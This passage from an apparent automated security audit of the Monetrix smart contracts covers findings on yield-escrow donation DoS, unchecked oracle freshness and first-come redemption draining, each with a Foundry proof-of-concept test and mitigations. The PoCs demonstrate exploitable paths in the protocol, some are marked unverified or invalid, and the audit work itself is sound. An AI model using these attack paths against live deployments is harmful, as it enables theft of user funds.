    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) allowance[from][msg.sender] = a - amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract U is T { function burn(uint256 amount) external { balanceOf[msg.sender] -= amount; } }

contract S {
    error TooMuch();
    uint256 public totalSupply = 1e6;
    uint256 public immutable maxInjection;
    constructor(uint256 m) { maxInjection = m; }
    function injectYield(uint256 amount) external { if (amount > maxInjection) revert TooMuch(); }
}

contract C {
    uint256 public userYieldBps = 7000;
    uint256 public insuranceYieldBps = 0;
    address public insuranceFund = address(0xBEEF);
    address public foundation = address(0xF00D);
}

contract Y {
    T public usdc;
    address public vault;
    constructor(T u, address v) { usdc = u; vault = v; }
    function balance() external view returns (uint256) { return usdc.balanceOf(address(this)); }
    function pullForDistribution(uint256 amount) external { usdc.transfer(vault, amount); }
}

contract YieldEscrowDonationDosTest is Test {
    function test_directDonationOverInjectionCapDosDistributeYield() external {
        address gov = address(0x100);
        address op = address(0x200);
        ACL acl = new ACL();
        acl.grant(acl.GOVERNOR(), gov);
        acl.grant(acl.OPERATOR(), op);
        T usdc = new T();
        U usdm = new U();
        uint256 maxInjection = 1_000_000e6;
        S susdm = new S(maxInjection);
        C cfg = new C();
        MonetrixVault impl = new MonetrixVault();
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), abi.encodeCall(MonetrixVault.initialize, (address(usdc), address(usdm), address(susdm), address(cfg), address(0xCAFE), address(acl))));
        MonetrixVault vault = MonetrixVault(address(proxy));
        Y y = new Y(usdc, address(vault));
        vm.startPrank(gov);
        vault.setAccountant(address(0xA11CE));
        vault.setRedeemEscrow(address(0xB0B));
        vault.setYieldEscrow(address(y));
        vm.stopPrank();
        uint256 threshold = (maxInjection * 10000) / 7000 + 1;
        usdc.mint(address(this), threshold);
        usdc.transfer(address(y), threshold);
        assertGt(threshold, maxInjection);
        vm.prank(op);
        vm.expectRevert(S.TooMuch.selector);
        vault.distributeYield();
        assertEq(usdc.balanceOf(address(y)), threshold);
    }
}


## Suggested Mitigation
Track an internal `pendingAccountedYield` amount increased only by successful `settle()` calls, and distribute only that accounted amount. Add a bounded `distributeYield(uint256 amount)` path, ignore unsolicited escrow balances, and provide a governed sweep/reclaim function for excess tokens.





Finding Status: LowSeverityDueToRareLikelihood + InvalidGovernanceRisk
```

### M-34 / `jdQ8Il4Cv1_wuMYDXr8CX`
- Finding title: HyperCore oracle prices are accepted without freshness or deviation checks when declaring distributable yield
- Report lines: 3410-3481
```md
## [M-34]. HyperCore oracle prices are accepted without freshness or deviation checks when declaring distributable yield

## id: jdQ8Il4Cv1_wuMYDXr8CX

## Derived From Pattern/Invariant
OracleUsingDEXorTWAP

## Exploit Type
Oracle

## Location
MonetrixAccountant.totalBackingSigned / settleDailyPnL

## Finding Status: LowSeverityDueToRareLikelihood
### Finding Status Justification: PrecompileReader.oraclePx only requires a successful response, length, and price > 0. MonetrixAccountant then uses that price to value spot and supplied assets in totalBackingSigned and distributableSurplus, which gates settlement. There is no heartbeat, deviation bound, finality check, or conservative fallback in the supplied code. If a stale or inflated HyperCore oracle value is returned, real EVM USDC can be moved and distributed as yield against overstated backing. Likelihood is rare because it depends on oracle/venue failure, but the impact can undercollateralize USDM.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The accountant values whitelisted spot and supplied hedge assets using `PrecompileReader.oraclePx()`. That reader only checks call success, response length, and `price > 0`:

`price = abi.decode(res, (uint64));`
`require(price > 0, "PrecompileReader: oracle px zero");`

There is no timestamp, heartbeat, round-finality, deviation, min/max answer, or fallback validation before the price is used in `spotNotionalUsdcFromPerp()` and `suppliedNotionalUsdcFromPerp()`. `settleDailyPnL()` then uses the resulting `totalBackingSigned()` to cap `proposedYield`. A stale or inflated HyperCore oracle value can therefore make the accountant report surplus that is only mark-to-oracle, allowing the vault to move real EVM USDC into `YieldEscrow` and distribute principal as yield.

## Impact
USDM backing can be converted into sUSDM yield, insurance deposits, and foundation payments based on stale or manipulated L1 prices. This undercollateralizes USDM and transfers value from redeemable USDM holders to current yield recipients.

## Command to Run Test


## Proof of Concept
1. The vault holds whitelisted spot collateral on HyperCore.
2. HyperCore oracle data for that perp index becomes stale or temporarily inflated, but remains positive.
3. `totalBackingSigned()` values the spot collateral at the inflated price because no freshness or deviation guard is enforced.
4. `settleDailyPnL(proposedYield)` accepts a yield amount up to the inflated `distributableSurplus()`.
5. `MonetrixVault.settle()` transfers real USDC from the vault to `YieldEscrow`.
6. `distributeYield()` pays that amount out as yield, leaving USDM supply backed by less real value once the oracle normalizes.

## Proof of Code
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {PrecompileReader} from "../src/core/PrecompileReader.sol";

contract OracleHarness {
    function read(uint32 asset) external view returns (uint64) {
        return PrecompileReader.oraclePx(asset);
    }
}

contract OracleFreshnessPoC is Test {
    function testOracleReaderAcceptsAnyPositivePriceWithoutAgeOrDeviationData() external {
        OracleHarness h = new OracleHarness();
        address oraclePx = address(0x0000000000000000000000000000000000000807);
        uint32 asset = 1;
        uint64 staleInflatedPrice = 10_000_000_000;
        vm.mockCall(oraclePx, abi.encode(asset), abi.encode(staleInflatedPrice));

        uint64 accepted = h.read(asset);
        assertEq(accepted, staleInflatedPrice, "positive stale/inflated price is accepted without freshness or deviation validation");
    }
}


## Suggested Mitigation
Require oracle freshness and sanity bounds before using prices in backing. Store per-asset heartbeat and deviation limits in config, reject prices outside configured bounds, and add a conservative fallback or pause settlement when oracle metadata cannot prove recency/finality. If HyperCore precompiles do not expose timestamps, maintain a protocol-side price attestation/reconciliation layer rather than treating any positive value as settlement-grade.
```

### M-35 / `jO-u5ALuLN4PJgk_lcDxg`
- Finding title: HyperCore oracle prices are accepted without freshness or deviation bounds, enabling false surplus settlement
- Report lines: 3482-3589
```md
## [M-35]. HyperCore oracle prices are accepted without freshness or deviation bounds, enabling false surplus settlement

## id: jO-u5ALuLN4PJgk_lcDxg

## Derived From Pattern/Invariant
StaleOracleAcceptance / OracleUsingDEXorTWAP

## Exploit Type
Oracle

## Location
MonetrixAccountant.totalBackingSigned

## Finding Status: LowSeverityDueToRareLikelihood
### Finding Status Justification: The accountant values whitelisted spot and supplied assets through oraclePx, which only checks successful call, response length, and nonzero price. That value feeds totalBackingSigned, surplus, distributableSurplus, and settlement. No freshness, deviation, finality, or last-good-price control is shown. A stale or inflated oracle can therefore create artificial surplus and allow settlement/distribution of value not backed by true asset value. This is a current root cause, although exploitation depends on rare oracle/venue failure conditions.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The accountant values whitelisted spot and supplied assets using `PrecompileReader.oraclePx()` but only checks that the precompile call succeeds and the returned price is nonzero. There is no timestamp, heartbeat, sequencer/finality, deviation, or last-good-price guard before the price is used in `totalBackingSigned()`, `surplus()`, `distributableSurplus()`, and ultimately the vault `settle()` path.

Vulnerable snippet:
`uint64 price = oraclePx(perpIndex); ... return TokenMath.spotNotionalUsdcFromPerpPx(bal.total, price, weiDec, szDec);`

`function oraclePx(uint32 assetIndex) internal view returns (uint64 price) { ... price = abi.decode(res, (uint64)); require(price > 0, "PrecompileReader: oracle px zero"); }`

## Impact
A stale or inflated HyperCore oracle price overstates backing and creates artificial surplus. The operator can then settle and distribute nonexistent yield: user share is minted as unbacked USDM to sUSDM, and insurance/foundation shares move real USDC out of the vault, diluting USDM backing and allowing value extraction by current sUSDM holders at the expense of later redeemers and USDM holders.

## Command to Run Test


## Proof of Concept
1. Vault holds 1,000 USDC and USDM supply is 1,000 USDM, so true surplus is zero.
2. The vault also holds a whitelisted spot asset whose oracle precompile returns a stale or inflated price.
3. `totalBackingSigned()` values the spot asset at the stale inflated price because `oraclePx()` only requires `price > 0`.
4. `distributableSurplus()` becomes positive and `settleDailyPnL()` accepts a proposed yield that would revert under the true price.
5. `distributeYield()` can mint unbacked USDM yield and route real USDC fees, reducing backing for all remaining USDM liabilities.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "src/core/MonetrixAccountant.sol";
import "src/interfaces/HyperCoreConstants.sol";
import "src/tokens/USDM.sol";

interface IERC20Like { function balanceOf(address) external view returns (uint256); function totalSupply() external view returns (uint256); }
interface IRedeemLike { function shortfall() external view returns (uint256); }

contract AccountantHarness is MonetrixAccountant {
    function initHarness(address _vault, address _usdc, address _usdm, address _config) external {
        vault = _vault;
        usdc = IERC20(_usdc);
        usdm = USDM(_usdm);
        config = _config;
        lastSettlementTime = block.timestamp - 365 days;
        minSettlementInterval = 1 hours;
    }
}

contract StaleOracleSettlementTest is Test {
    function testInflatedOracleCreatesSettleableSurplus() external {
        AccountantHarness accountant = new AccountantHarness();
        address vault = address(0x1000);
        address usdc = address(0x2000);
        address usdm = address(0x3000);
        address config = address(0x4000);
        address redeem = address(0x5000);
        accountant.initHarness(vault, usdc, usdm, config);

        vm.mockCall(vault, abi.encodeWithSignature("redeemEscrow()"), abi.encode(redeem));
        vm.mockCall(vault, abi.encodeWithSignature("multisigVault()"), abi.encode(address(0)));
        vm.mockCall(usdc, abi.encodeWithSelector(IERC20Like.balanceOf.selector, vault), abi.encode(1_000e6));
        vm.mockCall(usdc, abi.encodeWithSelector(IERC20Like.balanceOf.selector, redeem), abi.encode(0));
        vm.mockCall(usdm, abi.encodeWithSelector(IERC20Like.totalSupply.selector), abi.encode(1_000e6));
        vm.mockCall(redeem, abi.encodeWithSelector(IRedeemLike.shortfall.selector), abi.encode(0));

        vm.mockCall(config, abi.encodeWithSignature("tradeableAssetsLength()"), abi.encode(uint256(1)));
        vm.mockCall(config, abi.encodeWithSignature("tradeableAssets(uint256)", uint256(0)), abi.encode(uint32(1), uint32(2), uint32(10002)));
        vm.mockCall(config, abi.encodeWithSignature("maxAnnualYieldBps()"), abi.encode(uint256(1500)));

        vm.mockCall(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE, abi.encode(address(vault), uint64(2)), abi.encode(uint64(1_000_000), uint64(0), uint64(0)));
        uint64[] memory spots = new uint64[](0);
        vm.mockCall(HyperCoreConstants.PRECOMPILE_TOKEN_INFO, abi.encode(uint32(2)), abi.encode("BTC", spots, uint64(0), address(0), uint8(0), uint8(8), int8(0)));
        vm.mockCall(HyperCoreConstants.PRECOMPILE_PERP_ASSET_INFO, abi.encode(uint32(1)), abi.encode("BTC", uint32(0), uint8(8), uint8(50), false));
        vm.mockCall(HyperCoreConstants.PRECOMPILE_ORACLE_PX, abi.encode(uint32(1)), abi.encode(uint64(500e6)));
        vm.mockCall(HyperCoreConstants.PRECOMPILE_ACCOUNT_MARGIN_SUMMARY, abi.encode(uint32(0), vault), abi.encode(int64(0), uint64(0), uint64(0), int64(0)));
        vm.mockCall(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE, abi.encode(vault, uint64(0)), abi.encode(uint64(0), uint64(0), uint64(0)));
        vm.mockCall(HyperCoreConstants.PRECOMPILE_VAULT_EQUITY, abi.encode(vault, HyperCoreConstants.HLP_VAULT), abi.encode(uint64(0), uint64(0)));

        vm.prank(vault);
        accountant.settleDailyPnL(100e6);
        assertEq(accountant.totalSettledYield(), 100e6, "stale inflated oracle made false yield settleable");
    }
}

## Suggested Mitigation
Do not use a raw nonzero oracle price as sufficient proof of value. Add freshness/heartbeat and deviation checks, store and compare against last-good prices, enforce per-asset circuit breakers, and reject settlement when any feed lacks a recent timestamp/finality signal. If the precompile cannot expose freshness, cap or exclude that asset from distributable surplus until an independently fresh price source confirms it.





Finding Status: InvalidByDesign
```

### M-36 / `4L3Ikdc-lTfCMKnCPhROR`
- Finding title: First claimant can drain scarce RedeemEscrow liquidity and force later redemption claims to revert
- Report lines: 3590-3688
```md
## [M-36]. First claimant can drain scarce RedeemEscrow liquidity and force later redemption claims to revert

## id: 4L3Ikdc-lTfCMKnCPhROR

## Derived From Pattern/Invariant
FirstOrLastMoverAdvantage

## Exploit Type
FrontrunMev

## Location
RedeemEscrow.payOut

## Finding Status: InvalidByDesign
### Finding Status Justification: The cited safeguards only prevent partial underpayment and reclaiming funds below totalOwed; they do not prevent first-come ordering from exhausting scarce escrow liquidity and making later claims revert.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RedeemEscrow pays each redemption atomically at full face value whenever the current escrow balance covers that single claim, even when aggregate obligations are undercollateralized. The function does not snapshot available liquidity for all claimants, reserve pro-rata capacity, or enforce FIFO/fair settlement across totalOwed. Vulnerable snippet: `require(usdc.balanceOf(address(this)) >= amount, "RedeemEscrow: insufficient liquidity"); totalOwed -= amount; usdc.safeTransfer(recipient, amount);`. During a shortfall, claim ordering becomes economically decisive: an early claimant can consume available USDC and later equally valid claimants revert until new funds arrive.

## Impact
Under bridge-back delays or local liquidity shortages, earlier or MEV-prioritized claimants receive 100% of their USDC while later cooldown-expired redeemers are denied access to available liquidity. This creates a bank-run/gas-auction dynamic around each escrow funding event and can leave smaller or less sophisticated users stuck despite having mature redemption claims.

## Command to Run Test


## Proof of Concept
1. The vault has created two mature redemption obligations: Alice is owed 900 USDC and Bob is owed 900 USDC, so RedeemEscrow.totalOwed is 1800 USDC. 2. Only 1000 USDC is locally funded into RedeemEscrow because bridge liquidity is delayed. 3. Alice, a large claimant/searcher, back-runs the funding transaction and gets her vault claim processed first. 4. RedeemEscrow.payOut(Alice, 900) succeeds because the live balance covers Alice's individual amount, reducing escrow balance to 100 and totalOwed to 900. 5. Bob's equally mature claim for 900 USDC reverts with insufficient liquidity. 6. The next funding event repeats the same first-mover race instead of distributing scarce liquidity fairly.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "src/core/RedeemEscrow.sol";

contract MockUSDC {
    string public name = "Mock USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockACL {
    function UPGRADER() external pure returns (bytes32) { return keccak256("MONETRIX_UPGRADER"); }
    function hasRole(bytes32, address) external pure returns (bool) { return false; }
}

contract RedeemEscrowFirstMoverTest is Test {
    RedeemEscrow escrow;
    MockUSDC usdc;
    address vault = address(0xBEEF);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() external {
        usdc = new MockUSDC();
        escrow = new RedeemEscrow();
        escrow.initialize(address(usdc), vault, address(new MockACL()));
    }

    function test_firstClaimantDrainsScarceLiquidityAndSecondReverts() external {
        uint256 claim = 900e6;
        vm.startPrank(vault);
        escrow.addObligation(claim);
        escrow.addObligation(claim);
        vm.stopPrank();
        assertEq(escrow.totalOwed(), 1800e6);

        usdc.mint(address(escrow), 1000e6);

        vm.prank(vault);
        escrow.payOut(alice, claim);
        assertEq(usdc.balanceOf(alice), claim);
        assertEq(usdc.balanceOf(address(escrow)), 100e6);
        assertEq(escrow.totalOwed(), claim);

        vm.prank(vault);
        vm.expectRevert(bytes("RedeemEscrow: insufficient liquidity"));
        escrow.payOut(bob, claim);
        assertEq(usdc.balanceOf(bob), 0);
    }
}

## Suggested Mitigation
Avoid live-balance first-come settlement during shortfall. Snapshot each funding batch and settle matured redemptions by FIFO with explicit queue ordering or pro-rata allocation, or require the vault to fund enough USDC to cover all mature claims before allowing any payout from that batch. Expose and enforce per-request reserved liquidity rather than only aggregate totalOwed.
```
